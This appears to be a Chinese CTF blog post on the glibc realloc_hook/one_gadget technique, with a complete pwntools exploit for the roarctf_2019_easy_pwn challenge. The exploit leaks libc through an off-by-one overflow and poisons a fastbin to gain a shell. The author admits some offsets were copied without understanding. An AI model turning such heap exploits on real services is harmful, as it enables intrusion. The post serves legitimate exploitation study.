---
title: realloc hook
tags: [ctf-pwn,heap]
date: 2023-11-14 15:16:00
categories: [ctf-pwn]
excerpt: 执行one gadget的限制

---

one gadget 条件不满足，需要调整栈，让`rsp+xxx`等于null。

原理：

realloc的汇编代码，在调用realloc_hook之前比malloc、free等多了push指令和sub抬栈操作

realloc_hook同malloc_hook相邻，一次性修改两个，还可以用`malloc-0x23`

操作：

1. 修改malloc_hook为realloc控制栈帧的地址

2. 修改realloc_hook为onegadget

   

## roarctf_2019_easy_pwn

https://buuoj.cn/challenges#roarctf_2019_easy_pwn

不知道libc。buuoj只说了是ubuntu16，buuoj上下下来的libc-2.23.so和我抄的题解的不一样（one gadget就不一致），然后realloc偏移咋来的我就不知道了。。。mallochook的倒是对的

```python
from pwn import *
context(arch='amd64', os='linux')
p = process("./roar")
#p = remote("node4.buuoj.cn", 25453)
#gdb.attach(p)
libc = ELF("./libc-2.23.so")

def create(size):
	p.sendlineafter("choice: ", str(1))
	p.sendlineafter("size: ", str(size))

def write(index, size, content):
	p.sendlineafter("choice: ", str(2))
	p.sendlineafter("index: ", str(index))
	p.sendlineafter("size: ", str(size))
	p.sendlineafter("content: ", content)

def free(index):
	p.sendlineafter("choice: ", str(3))
	p.sendlineafter("index: ", str(index))

def show(index):
	p.sendlineafter("choice: ", str(4))
	p.sendlineafter("index: ", str(index))

create(0x18) #0
create(0x18) #1
create(0x88) #2
create(0x18) #3
write(0,0x18+10,'a'*0x18+'\xb1')
free(1)
create(0x18) #1
show(2)

p.recvuntil("content: ")
leak = u64(p.recvline()[:8])

libc1 = leak - libc.symbols['__malloc_hook'] - 0x68
malloc_hook = libc1 + libc.symbols['__malloc_hook']
free_hook = libc1 + libc.symbols['__free_hook']
fake_chunk = malloc_hook - 0x23

log.info("Leak is:        " + hex(leak))
log.info("Free hook is:   " + hex(free_hook))
log.info("Malloc hook is: " + hex(malloc_hook))
log.info("Fake chunk is:  " + hex(fake_chunk))
log.info("libc is:        " + hex(libc1))


realloc=libc1 + 0x846CD
log.info("realloc is      " + hex(realloc))

one_gadget=libc1 +0xf02a4


create(0x88) #4
create(0x18) #5
create(0x68) #6
create(0x18) #7
write(3,0x18+10,'a'*0x18+'\x91')
free(6)
free(5)
create(0x88) #5
write(5, 0x28, b'a'*0x18+p64(0x71)+p64(malloc_hook-0x23))
create(0x68) #6
create(0x68) #8
write(8, 0x1b, b'a'*0xb+p64(one_gadget)+p64(realloc))

create(0x18)
p.interactive()

```

